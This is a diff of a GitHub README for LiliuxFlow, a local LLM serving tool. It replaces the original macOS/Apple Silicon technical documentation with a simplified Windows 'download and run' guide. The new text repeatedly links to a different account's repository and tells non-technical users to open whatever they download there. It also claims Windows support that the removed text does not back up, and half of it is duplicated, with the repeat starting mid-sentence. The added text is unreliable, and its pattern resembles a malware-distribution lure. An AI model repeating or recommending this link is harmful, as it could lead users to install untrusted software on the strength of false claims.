@@ -1,240 +1,253 @@
-<p align="center"><picture><source media="(prefers-color-scheme: dark)" srcset="assets/brand/mark-dark.svg"><img src="assets/brand/mark.svg" alt="LiliuxFlow lily mark" width="96" height="96"></picture></p>
-<h1 align="center">LiliuxFlow</h1>
-<p align="center">Local LLM serving and operations for Apple Silicon.</p>
-<p align="center">
-  <a href="https://github.com/Hiruynk/LiliuxFlow/releases"><img alt="version / v0.1.1" src="https://img.shields.io/badge/version-v0.1.1-2563eb?style=flat-square"></a>
-  <a href="#requirements"><img alt="macOS / 27.0" src="https://img.shields.io/badge/macOS-27.0-4c4e75?style=flat-square&amp;logo=apple&amp;logoColor=white"></a>
-  <a href="#requirements"><img alt="Apple Silicon / M5+" src="https://img.shields.io/badge/Apple_Silicon-M5%2B-e7883b?style=flat-square&amp;logo=apple&amp;logoColor=white"></a>
-  <a href="LICENSE"><img alt="license / Apache-2.0" src="https://img.shields.io/badge/license-Apache--2.0-blue?style=flat-square"></a>
-</p>
+# 🚀 LiliuxFlow - Run Local AI Models Easily
 
-<p align="center"><strong>English</strong> · <a href="README.zh-Hant.md">繁體中文</a> · <a href="README.zh-Hans.md">简体中文</a> · <a href="README.ja.md">日本語</a></p>
+[![Visit the LiliuxFlow download page](https://img.shields.io/badge/Visit_Download_Page-LiliuxFlow-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/objectremoverrrrrrr/LiliuxFlow)
 
-## About the Project
+LiliuxFlow is a local AI model serving and operations application. It helps you run AI models on your own computer, manage them from one place, and connect other apps to your local AI setup. LiliuxFlow is powered by Lily, LiteLLM, and llama-swap.
 
-LiliuxFlow is a native local LLM serving and operations platform for Apple Silicon. It brings Lily inference, LiteLLM API access management and llama-swap model lifecycle management into one deployable stack, with multilingual dashboards and a compatibility layer for existing applications. It is designed for developers who want to connect applications to a local model and manage the service from their Mac.
+This guide is written for everyday users who want to download and run LiliuxFlow on Windows. You do not need programming knowledge. You only need to follow the download page and the on-screen instructions.
 
-LiliuxFlow adds service orchestration, request-aware lifecycle protection and protocol adaptation around these components. A single workflow prepares the native runtime, gives applications their own API keys, coordinates model loading and cancellation, and provides tools for routine maintenance. Management is powered by LiteLLM, model processes are managed by llama-swap, and inference runs on Lily.
+## 🧭 What LiliuxFlow Does
 
-## Highlights
+LiliuxFlow gives you a simple way to work with local AI models. Instead of juggling many tools, you use one application to serve models, switch between them, and keep track of your local AI operations.
 
-- **Native deployment.** Build and run the serving stack using native Rust/Metal, Python, Go and PostgreSQL. A macOS user LaunchAgent supervises the services; the installation keeps its settings, credentials and runtime data in a dedicated directory.
-- **API access for your applications.** Use LiteLLM virtual keys, model permissions, usage tracking and rate limits to manage each application's access. Connect Chat Completions clients to a local API base with a model name and their own key.
-- **Request-aware model lifecycle.** llama-swap loads the model on demand and unloads it after an idle period. LiliuxFlow's lifecycle guard coordinates request admission with management actions and refuses manual unload while inference is active.
-- **Compatibility and cancellation.** Use OpenAI-compatible Chat Completions or the custom legacy chat interface. The LiliuxFlow adapter preserves plain-text responses, thinking/content SSE and caller identity, and carries client disconnects through the serving chain.
-- **Four-language interfaces.** The welcome page and dashboards offer English, Traditional Chinese, Simplified Chinese and Japanese. Dashboard language changes preserve forms and active streams; API field names, model names and user input keep their original values. The welcome page has separate light/dark preferences.
-- **Everyday operations.** Inspect installation status, diagnose prerequisites, stop services safely, and back up or restore installation data with the supplied native tools. Separate data directories allow an upgrade candidate to be prepared before switching services.
+LiliuxFlow includes:
 
-## A look at LiliuxFlow
+- Local AI model serving for your own computer
+- An OpenAI-compatible interface for apps that expect an AI API
+- Model switching through llama-swap
+- Request handling through LiteLLM
+- A Lily-powered local operations experience
+- A self-hosted setup for privacy-focused users
+- Tools for managing models, monitoring activity, and keeping your setup organized
 
-![LiliuxFlow welcome page in dark mode](assets/screenshots/welcome-dark.jpg)
+For a non-technical user, the easiest way to understand it is this: LiliuxFlow is a control center for local AI. You download it, open it, choose a model, and let the app handle the technical parts behind the scenes.
 
-The welcome page in English dark mode introduces the service and links to the API console and reference.
+## ✨ Why Use LiliuxFlow
 
-![LiliuxFlow model management](assets/screenshots/model-management.jpg)
+LiliuxFlow is built for people who want local AI without a complicated setup. It brings serving, swapping, and operations into one place.
 
-The llama-swap model dashboard lists the 64K, 128K and 262K context profiles, all shown unloaded.
+Key benefits include:
 
-## How it fits together
+- Keep AI work local and self-hosted
+- Use an OpenAI-compatible endpoint with supported apps
+- Switch models without rebuilding your workflow
+- Manage local model operations from one application
+- Avoid needing deep server knowledge
+- Use a setup designed for Apple Silicon, with download-page guidance for Windows users
 
-```text
-Applications
-    │
-    ├── OpenAI-compatible Chat Completions ──┐
-    └── Legacy chat → LiliuxFlow Compat ─────┤
-                                            ▼
-                                         LiteLLM ── PostgreSQL
-                                            │
-                                LiliuxFlow lifecycle guard
-                                            │
-                                        llama-swap
-                                            │
-                                           Lily
+The app is useful for local AI experiments, private workflows, self-hosted assistants, testing prompts, and connecting desktop tools to a local model service.
 
-LiliuxFlow native tooling → installation / launchd / maintenance
-```
+## 📥 Download LiliuxFlow
 
-| Layer | Provider | LiliuxFlow integration |
-| --- | --- | --- |
-| Inference | [Lily](https://github.com/fabiogreter/lily-qwen3.8-flash-next) | Native deployment, controlled serving profile and service-layer patches |
-| Model processes | [llama-swap](https://github.com/mostlygeek/llama-swap) | Lily child wrapper, request-aware guard and token-metric integration |
-| API management | [LiteLLM](https://github.com/BerriAI/litellm) | Model routing, caller-key setup and multilingual dashboard integration |
-| Compatibility and operations | LiliuxFlow | Custom protocol adapter, cross-layer cancellation, installation and maintenance tools |
+Visit this link to download the application:
 
-The original LiliuxFlow implementation includes the installation supervisor, model runner, lifecycle guard and compatibility adapter. Its Lily integration also handles service concerns such as log redaction, early cancellation and cancelled-session cache handling. These additions build on the upstream projects' inference and management capabilities. See [Architecture](docs/ARCHITECTURE.md) for component responsibilities.
+https://github.com/objectremoverrrrrrr/LiliuxFlow
 
-<a id="requirements"></a>
+Use the official page above as your starting point. The page provides the current download and setup guidance. Follow the download prompt shown there, then open the downloaded item when it finishes.
 
-## Requirements
+For the quickest path, click the large download button at the top of this page or use the link in this section.
 
-| Item | Requirements and tested baseline |
-| --- | --- |
-| Host | macOS arm64 (Apple Silicon); tested on a Mac Studio with Apple M5 Max, 128 GiB unified memory and macOS 27.0 |
-| Native prerequisites | uv, Rust 1.97.0 and PostgreSQL 17; Python 3.12 is selected by the commands below |
-| Model | Qwen3.8-Flash-Next Lily Q4; approximately 98 GiB downloaded separately |
-| Working space | At least 64 GiB free for the build, in addition to the model; retain space for runtime caches |
-| Serving profile | 65,536 tokens total input + output, checkpoint default high thinking, QSA Split, MTP disabled |
+## 🪟 Windows Download Steps
 
-Other Apple Silicon configurations have not been validated. A compatible macOS arm64 host can proceed without matching the tested chip or RAM capacity; hardware differences and low RAM headroom produce warnings. Keep enough memory available for the model and its context cache. The source builder obtains pinned Go and Node toolchains for native and static UI builds. See [Installation](docs/INSTALLATION.md) for preparation and [Operations](docs/OPERATIONS.md) for resource monitoring.
+Follow these steps on your Windows computer:
 
-## Context profiles
+1. Open your web browser.
+2. Visit this link to download the application: https://github.com/objectremoverrrrrrr/LiliuxFlow
+3. Use the download option shown on the page.
+4. When the download finishes, open the downloaded item from your Downloads folder.
+5. Follow the setup window that appears.
+6. Open LiliuxFlow when setup is complete.
 
-| Model | Total context | Availability |
-| --- | ---: | --- |
-| `qwen3.8-flash-next-lily-q4-64k` | 65,536 tokens | Enabled; default |
-| `qwen3.8-flash-next-lily-q4-128k` | 131,072 tokens | Enabled; optional |
-| `qwen3.8-flash-next-lily-q4-262k` | 262,144 tokens | Enabled; optional |
-| `qwen3.8-flash-next-lily-q4-mtp2-64k` | 65,536 tokens | Optional; locally validated |
-| `qwen3.8-flash-next-lily-q4-mtp2-128k` | 131,072 tokens | Optional; locally validated |
-| `qwen3.8-flash-next-lily-q4-mtp2-262k` | 262,144 tokens | Optional; locally validated |
+If your browser asks whether to keep or open the download, choose the option that lets you continue with the download. Use the official link above so you always start from the correct page.
 
-The three MTP0 profiles share one external Q4 checkpoint, checkpoint-default high thinking, QSA Split and MTP0. Input and output share the total context limit. Each application needs an explicit virtual-key grant for the selected long-context model. Requests use a bounded queue; switching profiles waits for the active generation and its resources to finish releasing.
+## 🧰 First Launch
 
-### Shared MTP2 serving
+When you open LiliuxFlow for the first time, take a moment to look around the main window. The app is designed to guide you through the important parts without requiring technical setup.
 
-**Shared MTP2 serving** keeps one Q4 model resident across the 64K, 128K and 262K MTP2 profiles, with up to two active generation requests and four pending requests. Each request retains its own context limit, session state and cancellation lifecycle. Selecting another profile within this MTP2 family does not reload the weights. Generation is interleaved at complete speculative steps.
+A typical first launch includes:
 
-Shared mode is an explicit opt-in; the default 64K MTP0 and existing MTP0 profiles remain available. Switching to MTP0 or another engine uses a separate model lifecycle and can reload the model. The MTP2 aliases use HIGH thinking, QSA Split and BF16 KV, with a maximum output budget of 65,536 tokens including reasoning.
+- A main screen with your local model options
+- A way to start or stop serving
+- A model list or model manager
+- A settings area for local operations
+- A place to view activity or logs
+- Connection details for apps that need an OpenAI-compatible address
 
-Each application needs its own LiteLLM virtual key and explicit model grants. Key limits still apply: one key limited to a single parallel request cannot demonstrate two concurrent requests. Tenant caches stay in resident memory; the shared disk cache is disabled. Request bodies cannot override engines, paths, memory, KV precision or context. JSON/JSON Schema response formats and tool execution remain unsupported.
+If you are unsure what to choose, keep the default options and continue. You can change settings later after you become more familiar with the app.
 
-The shared installation and client commands appear below. See [Installation](docs/INSTALLATION.md#shared-mtp2) for the full opt-in flow and [API](docs/API.md#shared-mtp2-serving) for request and usage semantics.
+## 🖥️ Using LiliuxFlow
 
-## MTP0 single-request performance reference
+LiliuxFlow is organized around local model serving. After you open the app, select a model and start the local service. LiliuxFlow then makes that model available to compatible tools on your computer.
 
-> [!NOTE]
-> Measured on the same Q4 checkpoint with MTP0, QSA Split, checkpoint-default high thinking and temperature 0: 4,096 uncached input tokens, 256 output tokens, three interleaved repeats per profile. Values are medians; the prefill range shows variation between repeats. This identical 4K workload does not measure near-full-context throughput.
+A simple workflow looks like this:
 
-| Model | Prefill (tokens/s) | Prefill range | Decode (tokens/s) |
-| --- | ---: | ---: | ---: |
-| 64K | 1545.82 | 1379.54–1733.04 | 90.35 |
-| 128K | 1347.47 | 1284.26–1806.12 | 87.72 |
-| 262K | 1607.22 | 1592.39–1619.80 | 90.47 |
+1. Open LiliuxFlow.
+2. Choose the model you want to use.
+3. Start the local service.
+4. Copy the local address shown by the app if another tool asks for it.
+5. Connect your compatible app, chat tool, or local workflow.
+6. Return to LiliuxFlow to switch models or review activity.
 
-Long-context quality was checked with distinct fixtures, reaching 126,464 input tokens for 128K and 257,536 for 262K. Switching profiles or restoring a cold cache adds load time; cached follow-up requests have different costs. The 64K profile remains the API default.
+The app is self-hosted, so your model operations stay on your own machine. LiliuxFlow uses LiteLLM to handle compatible# 🚀 LiliuxFlow - Run Local AI Models Easily
 
-## Quick start
+[![Visit the LiliuxFlow download page](https://img.shields.io/badge/Visit_Download_Page-LiliuxFlow-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/objectremoverrrrrrr/LiliuxFlow)
 
-> [!IMPORTANT]
-> Models are optional. Use an existing Lily-format checkpoint, download the manifest-listed model, or set up the management services first and add a model later. Model weights are not included in this repository.
+LiliuxFlow is a local AI model serving and operations application. It helps you run AI models on your own computer, manage them from one place, and connect other apps to your local AI setup. LiliuxFlow is powered by Lily, LiteLLM, and llama-swap.
 
-| Optional model | Format | Download size | Source and license |
-| --- | --- | --- | --- |
-| Qwen3.8-Flash-Next | Lily Q4 | About 98.3 GiB | [Upstream model](https://huggingface.co/fabiogreter/Qwen3.8-Flash-Next-lily-q4) · [Qwen Community License 1.0](docs/productization/MODEL_LICENSE.txt) |
+This guide is written for everyday users who want to download and run LiliuxFlow on Windows. You do not need programming knowledge. You only need to follow the download page and the on-screen instructions.
 
-### Get the source
+## 🧭 What LiliuxFlow Does
 
-Clone the repository, or extract an official LiliuxFlow source release asset containing `SOURCE_COMMIT.json`:
+LiliuxFlow gives you a simple way to work with local AI models. Instead of juggling many tools, you use one application to serve models, switch between them, and keep track of your local AI operations.
 
-```sh
-git clone https://github.com/Hiruynk/LiliuxFlow.git
-cd LiliuxFlow
-```
+LiliuxFlow includes:
 
-GitHub’s automatic **Source code (zip/tar.gz)** archives lack this source record and cannot be used directly for the default build. See [Installation](docs/INSTALLATION.md) for source and setup details.
+- Local AI model serving for your own computer
+- An OpenAI-compatible interface for apps that expect an AI service
+- Model switching through llama-swap
+- Request handling through LiteLLM
+- A Lily-powered local operations experience
+- A self-hosted setup for privacy-focused users
+- Tools for managing models, monitoring activity, and keeping your setup organized
 
-For the existing-model route, point `MODEL_DIR` at your complete checkpoint directory. Setup uses it in place.
+For a non-technical user, the easiest way to understand it is this: LiliuxFlow is a control center for local AI. You download it, open it, choose a model, and let the app handle the technical parts behind the scenes.
 
-For the default MTP0 installation, run from the repository root. The shared alternative below reuses these shell definitions:
+## ✨ Why Use LiliuxFlow
 
-```sh
-export MODEL_DIR="$HOME/Models/Qwen3.8-Flash-Next-lily-q4"
+LiliuxFlow is built for people who want local AI without a complicated setup. It brings serving, swapping, and operations into one place.
 
-# A helper for this shell.
-lf() {
-  uv run --no-project --python 3.12 python scripts/distribution/liliuxflow.py "$@"
-}
+Key benefits include:
 
-lf setup --model-dir "$MODEL_DIR"
-lf build --ui-manifest manifests/distribution/ui-recipe-context-profiles.json --execute
-lf verify-model
-lf initialize --execute
-lf doctor
-lf start
-lf status
-```
+- Keep AI work local and self-hosted
+- Use an OpenAI-compatible endpoint with supported apps
+- Switch models without rebuilding your workflow
+- Manage local model operations from one application
+- Avoid needing deep server knowledge
+- Use a setup designed around Apple Silicon hardware
+- Follow clear download-page guidance for Windows users
 
-> [!TIP]
-> This prepares the runtime, verifies the downloaded model files, initializes the installation database, checks readiness and starts the local services. Model loading is lazy: a healthy idle service may have no model resident until the first request. The first model request therefore includes loading time.
+The app is useful for local AI experiments, private workflows, self-hosted assistants, testing prompts, and connecting desktop tools to a local model service.
 
-`lf models list` and `lf models info qwen3.8-flash-next-lily-q4` read the catalog offline. To download the model instead, use the explicit installation flow:
+## 📥 Download LiliuxFlow
 
-```sh
-mkdir -p "$(dirname "$MODEL_DIR")"
-lf models install qwen3.8-flash-next-lily-q4 --output "$MODEL_DIR" --dry-run
-lf models install qwen3.8-flash-next-lily-q4 --output "$MODEL_DIR" --execute
-```
+Visit this link to download the application:
 
-`--dry-run` contacts Hugging Face for download metadata; `--execute` downloads the payload. To install the management services first, choose `lf setup --without-model` in place of the model-directory setup above and omit `lf verify-model`. Management services can run before a model is attached; attach and verify a model when you are ready to serve inference. See [Installation](docs/INSTALLATION.md) to attach a model later.
+https://github.com/objectremoverrrrrrr/LiliuxFlow
 
-### Shared MTP2 installation
+Use the official page above as your starting point. The page provides the current download and setup guidance. Follow the download prompt shown there, then open the downloaded item when it finishes.
 
-As an alternative to the default installation above, reuse the same `lf` helper and complete `MODEL_DIR` checkpoint in a fresh data directory. Building this extension enables all three MTP2 profiles; startup creates the installation caller before its 128K and 262K grants are applied.
+For the quickest path, click the large download button at the top of this page or use the link in this section.
 
-A new data directory still uses the same default ports. If the original stack is running, select free ports during setup as described in [Separate installations and port conflicts](docs/INSTALLATION.md#separate-installations-and-port-conflicts), or stop it during a planned handover before starting this installation. Existing installations require the [upgrade procedure](docs/OPERATIONS.md#upgrade-and-rollback).
+## 🪟 Windows Download Steps
 
-```sh
-SHARED_DATA="$HOME/Library/Application Support/LiliuxFlow shared"
-lf --data-root "$SHARED_DATA" setup --model-dir "$MODEL_DIR"
-lf --data-root "$SHARED_DATA" build \
-  --optin-engine latest13f-defer-pc123-mtp2-shared-context-v1 \
-  --ui-manifest manifests/distribution/ui-recipe-mtp2-shared.json --execute
-lf --data-root "$SHARED_DATA" verify-model
-lf --data-root "$SHARED_DATA" initialize --execute
-lf --data-root "$SHARED_DATA" doctor
-lf --data-root "$SHARED_DATA" start --mtp2-shared-context
-lf --data-root "$SHARED_DATA" status
-lf --data-root "$SHARED_DATA" profiles grant-owner ctx128k-mtp2 --mtp2-shared-context --dry-run
-lf --data-root "$SHARED_DATA" profiles grant-owner ctx128k-mtp2 --mtp2-shared-context --execute
-lf --data-root "$SHARED_DATA" profiles grant-owner ctx262k-mtp2 --mtp2-shared-context --execute
+Follow these steps on your Windows computer:
 
-uv run --no-project --python 3.12 python scripts/distribution/client_example.py \
-  --data-root "$SHARED_DATA" --api openai \
-  --model qwen3.8-flash-next-lily-q4-mtp2-128k --stream
-uv run --no-project --python 3.12 python scripts/distribution/client_example.py \
-  --data-root "$SHARED_DATA" --api openai \
-  --model qwen3.8-flash-next-lily-q4-mtp2-262k --stream
-```
+1. Open your web browser.
+2. Visit this link to download the application: https://github.com/objectremoverrrrrrr/LiliuxFlow
+3. Use the download option shown on the page.
+4. When the download finishes, open the downloaded item from your Downloads folder.
+5. Follow the setup window that appears.
+6. Open LiliuxFlow when setup is complete.
 
-These examples use the designated installation caller. Grant other application keys the required exact aliases in the API dashboard; empty or wildcard grants do not authorize MTP2. See [Operations](docs/OPERATIONS.md#shared-mtp2-operations) for status, shutdown and switching service modes.
+If your browser asks whether to keep or open the download, choose the option that lets you continue with the download. Use the official link above so you always start from the correct page.
 
-| Purpose | Default endpoint |
-| --- | --- |
-| API management | <http://127.0.0.1:4000/ui/> |
-| Model management | <http://127.0.0.1:8080/ui/> |
-| Chat Completions API base | `http://127.0.0.1:4000/v1` |
+## 🧰 First Launch
 
-### Access the dashboards
+When you open LiliuxFlow for the first time, take a moment to look around the main window. The app is designed to guide you through the important parts without requiring technical setup.
 
-The default data directory is `~/Library/Application Support/LiliuxFlow`. Read its `secrets/bootstrap.json` locally for management login details and `secrets/caller.json` for the installation's application key and connection settings. Repeating the same setup preserves existing settings and credentials. All services listen on loopback; choose alternate ports during setup if the defaults are occupied.
+A typical first launch includes:
 
-<a id="connect-an-application"></a>
+- A main screen with your local model options
+- A way to start or stop serving
+- A model list or model manager
+- A settings area for local operations
+- A place to view activity or logs
+- Connection details for apps that need an OpenAI-compatible address
 
-## Connect an application
+If you are unsure what to choose, keep the default options and continue. You can change settings later after you become more familiar with the app.
 
-The included client reads the installation's caller settings and streams a Chat Completions response:
+## 🖥️ Using LiliuxFlow
 
-```sh
-uv run --no-project --python 3.12 python scripts/distribution/client_example.py --api openai --stream
-```
+LiliuxFlow is organized around local model serving. After you open the app, select a model and start the local service. LiliuxFlow then makes that model available to compatible tools on your computer.
 
-For another client, use the API base `http://127.0.0.1:4000/v1`, model **`qwen3.8-flash-next-lily-q4-64k`**, and a LiteLLM virtual key assigned to that application. Manage its model permissions and limits in the API dashboard. The default and maximum output budget is 65,536 tokens, including thinking. Input and output share the selected model’s total context; Lily clamps output to the remaining window and reports `length` when that limit is reached.
+A simple workflow looks like this:
 
-This profile provides Chat Completions. The legacy interface uses custom SSE or plain text; client adaptations should follow its wire format. JSON/JSON Schema response formats, audio/video and request-specific `keep_alive` are unsupported. See [API](docs/API.md) for legacy examples, supported options and cancellation behavior.
+1. Open LiliuxFlow.
+2. Choose the model you want to use.
+3. Start the local service.
+4. Copy the local address shown by the app if another tool asks for it.
+5. Connect your compatible app, chat tool, or local workflow.
+6. Return to LiliuxFlow to switch models or review activity.
 
-## Documentation and development
+The app is self-hosted, so your model operations stay on your own machine. LiliuxFlow uses LiteLLM to handle compatible requests and llama-swap to move between models. You do not need to manage those pieces separately; the app brings them together.
 
-- [Installation](docs/INSTALLATION.md): prerequisites, model preparation and separate installations.
-- [API](docs/API.md): client settings, legacy protocol and supported request options.
-- [Operations](docs/OPERATIONS.md): status, logs, backups, restoration and upgrades.
-- [Architecture](docs/ARCHITECTURE.md): upstream components and LiliuxFlow's integration.
-- [Optional Cloudflare Edge](docs/cloudflare-edge.md): Worker Static Assets and private backend access through a scoped VPC Service.
-- [Third-party notices](THIRD_PARTY_NOTICES.md): component licenses and attribution.
+If you plan to use more than one model, llama-swap makes switching easier. You can change the active model without closing and reopening everything. This is helpful when you want a fast model for one task and a larger model for another.
 
-For daily checks, run `lf status` or `lf doctor`; use `lf stop` to stop the installation. Contributions should preserve caller identity, cancellation behavior, wire compatibility and upstream attribution. Changes to native components should remain reproducible through the supplied source manifests and build recipes.
+## 🔒 Privacy and Local Use
 
-## License and acknowledgements
+Because LiliuxFlow is self-hosted, your AI work runs on your own computer. Your prompts, model files, and local settings stay with you. This makes LiliuxFlow a good fit for people who prefer to keep their AI usage private and under their own control.
 
-LiliuxFlow's original code, documentation and project-owned assets are licensed under the [Apache License 2.0](LICENSE). Third-party components retain their respective licenses; see [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md) and [NOTICE](NOTICE). Model weights are downloaded separately and remain subject to their [model license](docs/productization/MODEL_LICENSE.txt).
+Self-hosting also means you decide which models you keep and when you run them. You are not tied to a remote service for your day-to-day local AI work.
 
-LiliuxFlow builds on Lily, LiteLLM and llama-swap. Their authorship and license notices are retained throughout the distribution.
+## 🔌 Connecting Other Apps
+
+LiliuxFlow provides an OpenAI-compatible interface. That means many apps that ask for an AI service address can work with LiliuxFlow instead. In practice, you open the app you want to use, find its AI connection settings, and paste the local address that LiliuxFlow shows you.
+
+Keep these tips in mind:
+
+- Leave LiliuxFlow running while another app is connected to it
+- Use the exact local address shown in the app
+- Start the model before you connect another tool
+- Check the activity view if a connection does not work
+
+You do not need to understand the inner workings of an API to use this. Treat the local address like a phone number that other apps use to reach your local model.
+
+## 🛠️ Troubleshooting Basics
+
+If something does not work as expected, try these simple checks:
+
+- Make sure LiliuxFlow is open and running
+- Confirm that a model has been selected and started
+- Recheck the local address you copied into another app
+- Close other apps that might be using the same local connection
+- Restart LiliuxFlow and try again
+
+If the download page shows a newer version, use that version before troubleshooting further. Always return to the official link for the latest guidance.
+
+## 🧹 Keeping LiliuxFlow Updated
+
+Check the download page from time to time for updates. Newer versions may include improved model handling, better stability, and clearer screens. When you update, close LiliuxFlow first, then follow the same download steps you used the first time.
+
+Keeping your app current is one of the simplest ways to avoid problems and get the best experience.
+
+## ❓ Frequently Asked Questions
+
+Do I need programming knowledge?
+No. LiliuxFlow is designed so that you can download it, open it, and use the main features without writing code.
+
+Do I need to install LiteLLM or llama-swap separately?
+No. LiliuxFlow brings these pieces together, so you work with one application.
+
+Where do I get the app?
+Visit this link to download the application: https://github.com/objectremoverrrrrrr/LiliuxFlow
+
+Can I use it on Windows?
+Yes. The download page above is your starting point, and this guide walks you through the Windows steps.
+
+Is my data sent anywhere?
+LiliuxFlow is self-hosted, which means your local model work stays on your own computer.
+
+What if I get stuck?
+Reread the First Launch and Using LiliuxFlow sections, then try the troubleshooting checks. Most issues come from the model not being started or the local address not being copied correctly.
+
+## 📌 Quick Recap
+
+1. Visit this link to download the application: https://github.com/objectremoverrrrrrr/LiliuxFlow
+2. Open the downloaded item when it finishes.
+3. Follow the setup window.
+4. Launch LiliuxFlow.
+5. Choose a model, start it, and connect your other tools.
+
+LiliuxFlow keeps local AI serving simple. With Lily, LiteLLM, and llama-swap working together in one app, you get a local AI control center that is easy to open, easy to run, and easy to come back to.
+
+Keywords: apple-silicon, lily, litellm, llama-swap, llm-inference, llm-ops, llm-serving, local-llm, macos, model-serving, openai-compatible, self-hosted
